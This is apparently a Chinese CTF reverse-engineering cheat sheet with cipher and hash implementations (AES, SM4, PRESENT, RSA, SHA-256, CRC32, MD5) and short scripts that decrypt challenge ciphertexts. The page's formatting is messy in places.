            s[j] = data[i + j] ^ v[j];

        /* start AES cypher loop over all AES rounds */
        for (nr = 0; nr &lt;= g_aes_rounds[mode]; nr++) &#123;

            if (nr &gt; 0) &#123;

                /* do SubBytes */
                aes_sub_bytes(mode, s);

                /* do ShiftRows */
                aes_shift_rows(mode, s);

                if (nr &lt; g_aes_rounds[mode]) &#123;
                    /* do MixColumns */
                    aes_mix_columns(mode, s);
                &#125;
            &#125;

            /* do AddRoundKey */
            aes_add_round_key(mode, s, w, nr);
        &#125;

        /* save state (cypher) to user buffer */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            data[i + j] = v[j] = s[j];
    &#125;

    return 0;
&#125;
/****************************************************************************************************************/
void inv_shift_rows(AES_CYPHER_T mode, uint8_t *state)
&#123;
    uint8_t *s = (uint8_t *)state;
    int i, j, r;

    for (i = 1; i &lt; g_aes_nb[mode]; i++) &#123;
        for (j = 0; j &lt; g_aes_nb[mode] - i; j++) &#123;
            uint8_t tmp = s[i];
            for (r = 0; r &lt; g_aes_nb[mode]; r++) &#123;
                s[i + r * 4] = s[i + (r + 1) * 4];
            &#125;
            s[i + (g_aes_nb[mode] - 1) * 4] = tmp;
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
uint8_t inv_sub_sbox(uint8_t val)
&#123;
    return g_inv_sbox[val];
&#125;
/****************************************************************************************************************/
void inv_sub_bytes(AES_CYPHER_T mode, uint8_t *state)
&#123;
    int i, j;

    for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123;
        for (j = 0; j &lt; 4; j++) &#123;
            state[i * 4 + j] = inv_sub_sbox(state[i * 4 + j]);
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
void inv_mix_columns(AES_CYPHER_T mode, uint8_t *state)
&#123;
    uint8_t y[16] = &#123; 0x0e, 0x0b, 0x0d, 0x09,  0x09, 0x0e, 0x0b, 0x0d,
        0x0d, 0x09, 0x0e, 0x0b,  0x0b, 0x0d, 0x09, 0x0e &#125;;
    uint8_t s[4];
    int i, j, r;

    for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123;
        for (r = 0; r &lt; 4; r++) &#123;
            s[r] = 0;
            for (j = 0; j &lt; 4; j++) &#123;
                s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]);
            &#125;
        &#125;
        for (r = 0; r &lt; 4; r++) &#123;
            state[i * 4 + r] = s[r];
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
int aes_decrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
&#123;
    uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */
    uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */

    int nr, i, j;

    /* key expansion */
    aes_key_expansion(mode, key, w);

    /* start data cypher loop over input buffer */
    for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123;

        /* init state from user buffer (cyphertext) */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            s[j] = data[i + j];

        /* start AES cypher loop over all AES rounds */
        for (nr = g_aes_rounds[mode]; nr &gt;= 0; nr--) &#123;

            /* do AddRoundKey */
            aes_add_round_key(mode, s, w, nr);

            if (nr &gt; 0) &#123;

                if (nr &lt; g_aes_rounds[mode]) &#123;
                    /* do MixColumns */
                    inv_mix_columns(mode, s);
                &#125;

                /* do ShiftRows */
                inv_shift_rows(mode, s);

                /* do SubBytes */
                inv_sub_bytes(mode, s);
            &#125;
        &#125;

        /* save state (cypher) to user buffer */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            data[i + j] = s[j];
    &#125;

    return 0;
&#125;
/****************************************************************************************************************/
int aes_decrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
&#123;
    return aes_decrypt(mode, data, len, key);
&#125;
/****************************************************************************************************************/
int aes_decrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)
&#123;
    uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */
    uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */
    uint8_t v[4 * 4] = &#123; 0 &#125;; /* iv */


    int nr, i, j;

    /* key expansion */
    aes_key_expansion(mode, key, w);

    memcpy(v, iv, sizeof(v));

    /* start data cypher loop over input buffer */
    for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123;


        /* init state from user buffer (cyphertext) */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            s[j] = data[i + j];

        /* start AES cypher loop over all AES rounds */
        for (nr = g_aes_rounds[mode]; nr &gt;= 0; nr--) &#123;

            /* do AddRoundKey */
            aes_add_round_key(mode, s, w, nr);

            if (nr &gt; 0) &#123;

                if (nr &lt; g_aes_rounds[mode]) &#123;
                    /* do MixColumns */
                    inv_mix_columns(mode, s);
                &#125;

                /* do ShiftRows */
                inv_shift_rows(mode, s);

                /* do SubBytes */
                inv_sub_bytes(mode, s);
            &#125;
        &#125;

        /* save state (cypher) to user buffer */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++) &#123;
            uint8_t p = s[j] ^ v[j];
            v[j] = data[i + j];
            data[i + j] = p;
        &#125;
    &#125;

    return 0;
&#125;
/****************************************************************************************************************/
void aes_cypher_128_test()
&#123;
#if 1
    uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;;
    uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f &#125;;
#else
    uint8_t buf[] = &#123; 0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d,
        0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34 &#125;;
    uint8_t key[] = &#123; 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c &#125;;
#endif

    aes_encrypt(AES_CYPHER_128, buf, sizeof(buf), key);

    aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key);
&#125;
/****************************************************************************************************************/
void aes_cypher_192_test()
&#123;
    uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;;
    uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17 &#125;;

    aes_encrypt(AES_CYPHER_192, buf, sizeof(buf), key);

    aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key);
&#125;
/****************************************************************************************************************/
void aes_cypher_256_test()
&#123;
    uint8_t buf[] = &#123; 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff &#125;;
    uint8_t key[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f &#125;;

    aes_encrypt(AES_CYPHER_256, buf, sizeof(buf), key);

    aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key);
&#125;
/****************************************************************************************************************/
int main()
&#123;
    //数据
    uint8_t buf[] = &#123; 78, 204, 144, 217, 57, 62, 169, 79, 165, 219, 206, 216, 180, 137, 206, 138 &#125;;
    //密钥
    uint8_t key[] = &#123; 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112 &#125;;
    //向量
    //uint8_t iv[] = &#123;&#125;;
    switch (sizeof(key))
    &#123;
    //ECB
    case 16:aes_decrypt(AES_CYPHER_128, buf, sizeof(buf), key); break;
    case 24:aes_decrypt(AES_CYPHER_192, buf, sizeof(buf), key); break;
    case 32:aes_decrypt(AES_CYPHER_256, buf, sizeof(buf), key); break;
    //CBC
    /*
    case 16:aes_decrypt_cbc(AES_CYPHER_128, buf, sizeof(buf), key, iv); break;
    case 24:aes_decrypt_cbc(AES_CYPHER_192, buf, sizeof(buf), key, iv); break;
    case 32:aes_decrypt_cbc(AES_CYPHER_256, buf, sizeof(buf), key, iv); break;
    */
    &#125;
    for (int i = 0; i &lt; sizeof(buf); i++)
    &#123;
        printf(&quot;%c&quot;, buf[i] &amp; 0xFF);
    &#125;
    printf(&quot;\n&quot;);
    return 0;
&#125;
</code></pre>
<pre><code class="python">from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex

def add_to_16(text):
    if len(text.encode(&#39;utf-8&#39;)) % 16:
        add = 16 - (len(text.encode(&#39;utf-8&#39;)) % 16)
    else:
        add = 0
    text = text + (&#39;\0&#39; * add)
    return text.encode(&#39;utf-8&#39;)

def encrypt(text):
    key = &#39;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#39;.encode(&#39;utf-8&#39;)
    mode = AES.MODE_ECB
    text = add_to_16(text)
    cryptos = AES.new(key, mode)
    cipher_text = cryptos.encrypt(text)
    return cipher_text

def decrypt(text):
    key = &#39;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#39;.encode(&#39;utf-8&#39;)
    mode = AES.MODE_ECB
    cryptor = AES.new(key, mode)
    plain_text = cryptor.decrypt(a2b_hex(text))
    return bytes.decode(plain_text).rstrip(&#39;\0&#39;)

data = b&#39;\x96\x7f\x37\x7c\x26\x30\x03\xeb\x61\x6d\xa3\xda\x0c\x77\x3e\x7c\xdf\x18\x5d\x4e\xd9\xbe\x0a\x5c\x02\x36\x87\x37\xb4\x2f\xb1\x9f&#39;
data = b2a_hex(data)
ans = decrypt(data)
print(ans)
</code></pre>
<h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><h4 id="RC6"><a href="#RC6" class="headerlink" title="RC6"></a>RC6</h4><h4 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h4><pre><code class="cpp">#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

#ifndef GET_ULONG_BE
#define GET_ULONG_BE(n,b,i) \
    &#123; \
        (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \
              | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \
              | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \
              | ( (unsigned long) (b)[(i) + 3] ); \
    &#125;
#endif

#ifndef PUT_ULONG_BE
#define PUT_ULONG_BE(n,b,i) \
    &#123; \
        (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \
        (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \
        (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \
        (b)[(i) + 3] = (unsigned char) ( (n) ); \
    &#125;
#endif

#define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)
#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))

#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125;

static const unsigned char SboxTable[16][16] = &#123;
    &#123;0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05&#125;,
    &#123;0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99&#125;,
    &#123;0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62&#125;,
    &#123;0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6&#125;,
    &#123;0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8&#125;,
    &#123;0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35&#125;,
    &#123;0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87&#125;,
    &#123;0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e&#125;,
    &#123;0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1&#125;,
    &#123;0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3&#125;,
    &#123;0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f&#125;,
    &#123;0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51&#125;,
    &#123;0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8&#125;,
    &#123;0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0&#125;,
    &#123;0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84&#125;,
    &#123;0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;
&#125;;

static const unsigned long FK[4] = &#123;0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc&#125;;

static const unsigned long CK[32] = &#123;
    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,
    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,
    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,
    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,
    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,
    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,
    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,
    0x10171e25,0x2c333a41,0x484f565d,0x646b7279
&#125;;

static unsigned char sm4Sbox(unsigned char inch) &#123;
    unsigned char *pTable = (unsigned char *)SboxTable;
    unsigned char retVal = (unsigned char)(pTable[inch]);
    return retVal;
&#125;

static unsigned long sm4Lt(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long c = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka,a,0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb,b,0)
    c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24));
    return c;
&#125;

static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk) &#123;
    return (x0^sm4Lt(x1^x2^x3^rk));
&#125;



static void sm4_one_round( unsigned long sk[32],
                           unsigned char input[16],
                           unsigned char output[16] ) &#123;
    unsigned long i = 0;
    unsigned long ulbuf[36];

    memset(ulbuf, 0, sizeof(ulbuf));
    GET_ULONG_BE( ulbuf[0], input, 0 )
    GET_ULONG_BE( ulbuf[1], input, 4 )
    GET_ULONG_BE( ulbuf[2], input, 8 )
    GET_ULONG_BE( ulbuf[3], input, 12 )
    while(i&lt;32) &#123;
        ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);
        i++;
    &#125;
    PUT_ULONG_BE(ulbuf[35],output,0);
    PUT_ULONG_BE(ulbuf[34],output,4);
    PUT_ULONG_BE(ulbuf[33],output,8);
    PUT_ULONG_BE(ulbuf[32],output,12);
&#125;

static unsigned long sm4CalciRK(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long rk = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka,a,0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb,b,0)
    rk = bb^(ROTL(bb, 13))^(ROTL(bb, 23));
    return rk;
&#125;

static void sm4_setkey( unsigned long sk[32], unsigned char key[16] ) &#123;
    unsigned long MK[4];
    unsigned long k[36];
    unsigned long i = 0;

    GET_ULONG_BE( MK[0], key, 0 );
    GET_ULONG_BE( MK[1], key, 4 );
    GET_ULONG_BE( MK[2], key, 8 );
    GET_ULONG_BE( MK[3], key, 12 );
    k[0] = MK[0]^FK[0];
    k[1] = MK[1]^FK[1];
    k[2] = MK[2]^FK[2];
    k[3] = MK[3]^FK[3];
    for(; i&lt;32; i++) &#123;
        k[i+4] = k[i] ^ (sm4CalciRK(k[i+1]^k[i+2]^k[i+3]^CK[i]));
        sk[i] = k[i+4];
    &#125;
&#125;

int main() &#123;
    unsigned char key[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;;
    unsigned char input[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;;
    unsigned char output[16];
    unsigned long sk[32];
    unsigned long i;

    sm4_setkey(sk,key);

    sm4_one_round(sk, input,output);

    for(i=0; i&lt;16; i++)
        printf(&quot;%02x &quot;, output[i]);
    printf(&quot;\n&quot;);

    return 0;
&#125;
</code></pre>
<h4 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h4><h4 id="Twofish"><a href="#Twofish" class="headerlink" title="Twofish"></a>Twofish</h4><h4 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h4><p>在线工具请：<br><a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p>
<h4 id="PRESENT"><a href="#PRESENT" class="headerlink" title="PRESENT"></a>PRESENT</h4><pre><code class="python">Sbox = [12, 5, 6, 11, 9, 0, 10, 13, 3, 14, 15, 8, 4, 7, 1, 2]

Sbox_inv = [Sbox.index(x) for x in range(16)]

PBox = [
    0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51,
    4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55,
    8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59,
    12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63
]

PBox_inv = [PBox.index(x) for x in range(64)]


def addRoundKey(state, roundkey):
    return state ^ roundkey


def sBoxLayer(state):
    output = 0
    for i in range(16):
        output += Sbox[(state &gt;&gt; (i * 4)) &amp; 15] &lt;&lt; (i * 4)
    return output


def pLayer(state):
    output = 0
    for i in range(64):
        output += ((state &gt;&gt; i) &amp; 1) &lt;&lt; PBox[i]
    return output


def string2number(i):
    return sum([(ord(i[c]) &lt;&lt; (8 * c)) for c in range(8)])


def generateRoundkeys80(key, rounds):
    roundkeys = []
    for i in range(1, rounds + 1):
        roundkeys.append(key &gt;&gt; 16)

        key = ((key &amp; 524287) &lt;&lt; 61) + (key &gt;&gt; 19)

        key = (Sbox[key &gt;&gt; 76] &lt;&lt; 76) + (key &amp; ((2 ** 76) - 1))

        key ^= i &lt;&lt; 15
    return roundkeys


def encrypt(blocks):
    rounds = 32
    roundkeys = generateRoundkeys80(85354531916197809168417, rounds)
    out = []

    for block in blocks:
        state = string2number(block)

        for i in range(rounds - 1):
            state = addRoundKey(state, roundkeys[i])
            state = sBoxLayer(state)
            state = pLayer(state)

        cipher = addRoundKey(state, roundkeys[-1])
        out.append(cipher)

    return out


inp = input(&#39;pls input ur flag:&#39;)

if len(inp) != 32:
    print(&#39;wrong!&#39;)
    exit(0)

blocks = [inp[:8], inp[8:16], inp[16:24], inp[24:32]]

out_blocks = encrypt(blocks)

解密脚本直接逆着写就行，这里的输入是32位的，然后分块。
```python
Sbox = [12, 5, 6, 11, 9, 0, 10, 13, 3, 14, 15, 8, 4, 7, 1, 2]

Sbox_inv = [Sbox.index(x) for x in range(16)]

PBox = [
    0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51,
    4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55,
    8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59,
    12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63
]

PBox_inv = [PBox.index(x) for x in range(64)]


def addRoundKey(state, roundkey):
    return state ^ roundkey


def generateRoundkeys80(key, rounds):
    roundkeys = []
    for i in range(1, rounds + 1):
        roundkeys.append(key &gt;&gt; 16)

        key = ((key &amp; 524287) &lt;&lt; 61) + (key &gt;&gt; 19)

        key = (Sbox[key &gt;&gt; 76] &lt;&lt; 76) + (key &amp; ((2 ** 76) - 1))

        key ^= (i &lt;&lt; 15)
    return roundkeys


def inv_sBoxLayer(state):
    output = 0
    for i in range(16):
        output += Sbox_inv[(state &gt;&gt; (i * 4)) &amp; 15] &lt;&lt; (i * 4)
    return output


def inv_pLayer(state):
    output = 0
    for i in range(64):
        output += ((state &gt;&gt; i) &amp; 1) &lt;&lt; PBox_inv[i]
    return output


def number2string(n):
    chars = []
    for i in range(8):
        chars.append(chr((n &gt;&gt; (i * 8)) &amp; 0xFF))
    return &#39;&#39;.join(chars)


def decrypt(ciphers):
    rounds = 32
    roundkeys = generateRoundkeys80(85354531916197809168417, rounds)
    out = []

    for cipher in ciphers:
        state = cipher

        for i in range(rounds - 1, 0, -1):
            state = addRoundKey(state, roundkeys[i])
            state = inv_pLayer(state)
            state = inv_sBoxLayer(state)

        block = addRoundKey(state, roundkeys[0])
        out.append(number2string(block))

    return &#39;&#39;.join(out)


cmps = [120617461261311902, 16357837616839286114, 312508749794633008, 1843701600916795272]

decrypted_flag = decrypt(cmps)
print(decrypted_flag)

## 非对称

#### RSA

```python
import gmpy2
from Crypto.Util.number import long_to_bytes
e = 65537
n = 36618139579386063246087882054063631367923586826293230665209915187491823328978276724908066032487515386697740611819366867179565337532194305783987450587518624526250530134446397
c = 3053043969587277731075013823380664207370991627277672374256662715889363487017560381573682876563907215099359894935326265406537547932246927604121814198201993671878573628633125
p=[521,521,521,541,547,557,557,577,587,593,601,607,631,631,631,631,641,643,683,701,701,719,727,727,727,733,739,739,743,757,761,769,773,787,787,809,821,821,821,863,877,877,881,907,907,907,907,907,919,919,929,937,953,953,967,967,991,997,997,1019]

p.append(521)
phi=1
a=0
for i in p:
    if (a==i):
        phi*=i
    phi*=i-1
    a=i

# phi = (p - 1) * (q - 1)
# n = p * q
d = gmpy2.invert(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
</code></pre>
<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><h4 id="sha系列"><a href="#sha系列" class="headerlink" title="sha系列"></a>sha系列</h4><p>cyberchef本地请</p>
<pre><code class="cpp">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;
#include &lt;math.h&gt;

#define GROUP_SIZE 64 
#define MAX_SIZE 1024

unsigned int const K[64] =&#123;
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,  
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,  
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,  
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,  
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,  
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,  
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,  
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2  
   &#125;;


unsigned int ROR(unsigned int x, unsigned int n);
unsigned int SHR(unsigned int x,unsigned int n);
unsigned int Ch(unsigned int E,unsigned int F,unsigned int G);
unsigned int Maj(unsigned int A,unsigned int B,unsigned int C);
unsigned int Lsigma_0(unsigned int A);
unsigned int Lsigma_1(unsigned int E);
unsigned int Ssigma_0(unsigned int x);
unsigned int Ssigma_1(unsigned int x);

void sha_init(unsigned int *A,unsigned int *B,unsigned int *C,unsigned int *D,unsigned int *E,unsigned int *F,unsigned int *G,unsigned int *H);
size_t sha_update(unsigned char **out, char const *input, size_t inLen);
void sha_transform(unsigned int *out,  char *input);
void data_round(unsigned int *A,unsigned int *B,unsigned int *C,unsigned int *D,unsigned int *E,unsigned int *F,unsigned int *G,unsigned int *H,unsigned int const *M);
void sha_calc(char *out, char const *input, size_t inLen);
</code></pre>
<h4 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h4><pre><code class="cpp">uint32_t crc32(const void* buf, size_t size) &#123;
    const uint8_t* p = buf;
    uint32_t crc = ~0U;
    while (size--) &#123;
        crc = crc32_tab[(crc ^ *p++) &amp; 0xFF] ^ (crc &gt;&gt; 8);
    &#125;
    return ~crc;
&#125;
uint crc32(byte *data, int size)
&#123;
    uint r = ~0; byte *end = data + size;
    while(data &lt; end)
    &#123;
        r ^= *data++;
        for(int i = 0; i &lt; 8; i++)
        &#123;
            uint t = ~((r&amp;1) — 1); r = (r&gt;&gt;1) ^ (0xEDB88320 &amp; t);
        &#125;
    &#125;
    return ~r;
&#125;
</code></pre>
<h4 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h4><p>cyberchef本地请</p>
<pre><code class="cpp">
#include &quot;md5.h&quot;


unsigned int ROTATE_LEFT(unsigned int x, unsigned int n) &#123;
    return ((x &lt;&lt; n) | (x &gt;&gt; (32 - n)));
&#125;

unsigned int F(unsigned int X, unsigned int Y, unsigned int Z) &#123;
    return (X &amp; Y) | ((~X) &amp; Z);
&#125;

unsigned int G(unsigned int X, unsigned int Y, unsigned int Z) &#123;
    return (X &amp; Z) | (Y &amp; (~Z));
&#125;

unsigned int H(unsigned int X, unsigned int Y, unsigned int Z) &#123;
    return (X ^ Y ^ Z);
&#125;

unsigned int I(unsigned int X, unsigned int Y, unsigned int Z) &#123;
    return (Y ^ (X | (~Z)));
&#125;

void FF(unsigned int *a,unsigned int b,unsigned int c,unsigned int d,unsigned int m,unsigned int const t,unsigned int s)&#123;
    *a += F(b,c,d) + m + t;
    *a = ROTATE_LEFT(*a,s);
    *a += b;
    
    return;
&#125;

void GG(unsigned int *a,unsigned int b,unsigned int c,unsigned int d,unsigned int m,unsigned int const t,unsigned int s)&#123;
    *a += G(b,c,d) + m + t;
    *a = ROTATE_LEFT(*a,s);
    *a += b;
    
    return;
&#125;

void HH(unsigned int *a,unsigned int b,unsigned int c,unsigned int d,unsigned int m,unsigned int const t,unsigned int s)&#123;
    *a += H(b,c,d) + m + t;
    *a = ROTATE_LEFT(*a,s);
    *a += b;
    
    return;
&#125;

void II(unsigned int *a,unsigned int b,unsigned int c,unsigned int d,unsigned int m,unsigned int const t,unsigned int s)&#123;
    *a += I(b,c,d) + m + t;
    *a = ROTATE_LEFT(*a,s);
    *a += b;
    
    return;
&#125;

unsigned int shift(unsigned int a)&#123;
    unsigned int t1,t2,t3,t4;
    t1 = (a &amp; 0xFF) &lt;&lt; 24;
    t2 = (a &amp; 0xFF00) &lt;&lt; 8;
    t3 = (a &gt;&gt; 8) &amp; 0xFF00;
    t4 = (a &gt;&gt; 24) &amp; 0xFF;
    //printf(&quot;%x\n&quot;,t1 + t2 + t3 + t4);
    return (t1 + t2 + t3 + t4);
&#125;
    


/* MD5 initialization */
void md5_init(unsigned int *A,unsigned int *B,unsigned int *C,unsigned int *D)&#123;
    unsigned char data[] = &#123;
        0x01, 0x23, 0x45, 0x67,
        0x89, 0xAB, 0xCD, 0xEF,
        0xFE, 0xDC, 0xBA, 0x98,
        0x76, 0x54, 0x32, 0x10
    &#125;;

    memcpy(A, data, 4);
    memcpy(B, data + 4, 4);
    memcpy(C, data + 8, 4);
